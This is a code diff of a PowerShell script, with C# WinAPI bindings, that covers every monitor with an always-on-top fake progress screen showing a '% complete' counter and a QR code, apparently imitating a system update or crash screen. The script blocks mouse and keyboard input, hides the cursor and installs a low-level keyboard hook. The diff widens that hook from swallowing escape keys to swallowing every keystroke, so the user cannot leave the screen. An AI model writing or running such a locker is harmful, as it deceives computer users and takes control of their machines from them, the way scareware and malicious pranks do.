@@ -15,11 +15,8 @@ public class WinAPI {
     [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string lpModuleName);
     [DllImport("user32.dll")] public static extern bool BlockInput(bool fBlockIt);
     [DllImport("user32.dll")] public static extern int ShowCursor(bool bShow);
-    [DllImport("user32.dll")] public static extern bool SetCursorPos(int X, int Y);
-    [DllImport("user32.dll")] public static extern bool SystemParametersInfo(uint uiAction, uint uiParam, IntPtr pvParam, uint fWinIni);
 
     public delegate IntPtr LowLevelProc(int nCode, IntPtr wParam, IntPtr lParam);
-
     private static IntPtr hookId = IntPtr.Zero;
     private static LowLevelProc hookProc;
 
@@ -28,32 +25,15 @@ public class WinAPI {
         var mod = GetModuleHandle(System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName);
         hookId = SetWindowsHookEx(13, hookProc, mod, 0);
     }
-
-    public static void UninstallHook() {
-        UnhookWindowsHookEx(hookId);
-    }
+    public static void UninstallHook() { UnhookWindowsHookEx(hookId); }
 
     private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
-        if (nCode >= 0) {
-            int vk = Marshal.ReadInt32(lParam);
-            // Win L, Win R, Tab, Alt+Tab, Ctrl+Esc, Esc, F4, F12, Win+D, Win+Tab
-            if (vk == 0x5B || vk == 0x5C || vk == 0x09 || vk == 0x1B ||
-                vk == 0x73 || vk == 0x74 || vk == 0x75 || vk == 0x76 ||
-                vk == 0x77 || vk == 0x78 || vk == 0x79 || vk == 0x7A ||
-                vk == 0x7B || vk == 0x20 || vk == 0x2E) {
-                return (IntPtr)1;
-            }
-        }
+        if (nCode >= 0) return (IntPtr)1;
         return CallNextHookEx(hookId, nCode, wParam, lParam);
     }
 
-    public static void HideCursor() {
-        for (int i = 0; i < 20; i++) ShowCursor(false);
-    }
-
-    public static void ShowCursorAgain() {
-        for (int i = 0; i < 20; i++) ShowCursor(true);
-    }
+    public static void HideCursor() { for (int i = 0; i < 20; i++) ShowCursor(false); }
+    public static void ShowCursorAgain() { for (int i = 0; i < 20; i++) ShowCursor(true); }
 }
 "@
 
@@ -61,71 +41,63 @@ public class WinAPI {
 [WinAPI]::BlockInput($true)
 [WinAPI]::HideCursor()
 
-$screens = [System.Windows.Forms.Screen]::AllScreens
-$forms = @()
+$qrMatrix = @(
+    "1111111001101001111111",
+    "1000001010101001000001",
+    "1011101001001001011101",
+    "1011101011010101011101",
+    "1011101001101001011101",
+    "1000001010010101000001",
+    "1111111010101011111111",
+    "0000000011010100000000",
+    "1101101110101011010110",
+    "0101010001010100010101",
+    "1010110110100110101101",
+    "0101001001010001010100",
+    "1110111010110111011101",
+    "0000000001010100000001",
+    "1111111010110111100110",
+    "1000001001001001001011",
+    "1011101011010110110100",
+    "1011101000101001010111",
+    "1011101011010010101101",
+    "1000001010100101000010",
+    "1111111001011011111110"
+)
 
-function Draw-QR($size) {
+function New-QRBitmap($size) {
+    $rows = $qrMatrix.Count
+    $cols = $qrMatrix[0].Length
     $bmp = New-Object System.Drawing.Bitmap($size, $size)
     $g = [System.Drawing.Graphics]::FromImage($bmp)
+    $g.SmoothingMode = [System.Drawing.Drawing2D.SmoothingMode]::None
     $g.Clear([System.Drawing.Color]::White)
 
-    $cells = 29
-    $cs = [int]($size / $cells)
+    $quiet = 2
+    $totalCells = $rows + $quiet * 2
+    $cs = [math]::Floor($size / $totalCells)
+    $offsetX = [math]::Floor(($size - $cs * $totalCells) / 2)
+    $offsetY = $offsetX
 
-    $pattern = @(
-        "11111110100001010111111",
-        "10000010011010010000001",
-        "10111010110100010111101",
-        "10111010001011010111101",
-        "10111010110001010111101",
-        "10000010101010010000001",
-        "11111110101010111111110",
-        "00000000010101000000000",
-        "11011011111010111011011",
-        "01010100010101010101010",
-        "10110111001010110110111",
-        "01010100101010101010100",
-        "10110111010101110110111",
-        "01010100101010101010100",
-        "11111110101010111011011",
-        "00000000010101000000000",
-        "11111110101010111111110",
-        "10000010101010010000001",
-        "10111010110100010111101",
-        "10111010001011010111101",
-        "10111010110001010111101",
-        "10000010101010010000001",
-        "11111110100001010111111"
-    )
+    $black = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::Black)
 
-    $black = [System.Drawing.SolidBrush]::new([System.Drawing.Color]::Black)
-
-    for ($r = 0; $r -lt $cells; $r++) {
-        for ($c = 0; $c -lt $cells; $c++) {
-            $patRow = $r % $pattern.Count
-            $patCol = $c % $pattern[0].Length
-            if ($patRow -lt $pattern.Count -and $patCol -lt $pattern[$patRow].Length) {
-                if ($pattern[$patRow][$patCol] -eq '1') {
-                    $g.FillRectangle($black, $c * $cs, $r * $cs, $cs, $cs)
-                }
+    for ($r = 0; $r -lt $rows; $r++) {
+        for ($c = 0; $c -lt $cols; $c++) {
+            if ($qrMatrix[$r][$c] -eq '1') {
+                $x = $offsetX + ($c + $quiet) * $cs
+                $y = $offsetY + ($r + $quiet) * $cs
+                $g.FillRectangle($black, $x, $y, $cs, $cs)
             }
         }
     }
 
-    $outerPen = New-Object System.Drawing.Pen([System.Drawing.Color]::Black, 3)
-    $innerPen = New-Object System.Drawing.Pen([System.Drawing.Color]::Black, 2)
-
-    foreach ($pos in @(@(0,0), @(0, $cells-7), @($cells-7, 0))) {
-        $px = $pos[1] * $cs
-        $py = $pos[0] * $cs
-        $g.DrawRectangle($outerPen, $px, $py, $cs*7, $cs*7)
-        $g.FillRectangle($black, ($px + $cs*2), ($py + $cs*2), $cs*3, $cs*3)
-    }
-
-    $g.Dispose()
     $black.Dispose()
+    $g.Dispose()
     return $bmp
 }
+
+$screens = [System.Windows.Forms.Screen]::AllScreens
+$forms = @()
 
 foreach ($screen in $screens) {
     $sw = $screen.Bounds.Width
@@ -169,18 +141,19 @@ foreach ($screen in $screens) {
     $lPct.Location = New-Object System.Drawing.Point($ml, $pctTop)
     $form.Controls.Add($lPct)
 
-    $qrTop = $pctTop + [int]($sh * 0.11)
-    $qrSize = [int]($sh * 0.115)
-    $qrBmp = Draw-QR $qrSize
+    $qrTop  = $pctTop + [int]($sh * 0.11)
+    $qrSize = [int]($sh * 0.13)
+    $qrBmp  = New-QRBitmap $qrSize
 
     $qrBox = New-Object System.Windows.Forms.PictureBox
     $qrBox.Size = New-Object System.Drawing.Size($qrSize, $qrSize)
     $qrBox.Location = New-Object System.Drawing.Point($ml, $qrTop)
     $qrBox.Image = $qrBmp
-    $qrBox.SizeMode = [System.Windows.Forms.PictureBoxSizeMode]::StretchImage
+    $qrBox.SizeMode = [System.Windows.Forms.PictureBoxSizeMode]::Normal
+    $qrBox.BackColor = [System.Drawing.Color]::White
     $form.Controls.Add($qrBox)
 
-    $infoX = $ml + $qrSize + [int]($sw * 0.018)
+    $infoX  = $ml + $qrSize + [int]($sw * 0.018)
     $infoFs = [int]($sh * 0.014)
     $infoFont = New-Object System.Drawing.Font("Segoe UI", $infoFs, [System.Drawing.FontStyle]::Regular)
 
@@ -189,7 +162,7 @@ foreach ($screen in $screens) {
     $lI1.Font = $infoFont
     $lI1.ForeColor = [System.Drawing.Color]::White
     $lI1.AutoSize = $false
-    $lI1.Width = [int]($sw * 0.38)
+    $lI1.Width = [int]($sw * 0.40)
     $lI1.Height = [int]($sh * 0.07)
     $lI1.Location = New-Object System.Drawing.Point($infoX, $qrTop)
     $form.Controls.Add($lI1)
@@ -218,8 +191,8 @@ foreach ($screen in $screens) {
 }
 
 $startTime = Get-Date
-$endTime = $startTime.AddSeconds($duration)
-$tickCount = 0
+$endTime   = $startTime.AddSeconds($duration)
+$tick      = 0
 
 while ((Get-Date) -lt $endTime) {
     $elapsed = ((Get-Date) - $startTime).TotalSeconds
@@ -227,16 +200,14 @@ while ((Get-Date) -lt $endTime) {
 
     foreach ($f in $forms) {
         $f.LabelPct.Text = "$percent% complete"
-        $f.Form.TopMost = $true
+        $f.Form.TopMost  = $true
         $f.Form.BringToFront()
         $f.Form.Activate()
         $f.Form.Refresh()
     }
 
-    $tickCount++
-    if ($tickCount % 5 -eq 0) {
-        [WinAPI]::HideCursor()
-    }
+    $tick++
+    if ($tick % 3 -eq 0) { [WinAPI]::HideCursor() }
 
     [System.Windows.Forms.Application]::DoEvents()
     Start-Sleep -Milliseconds 200
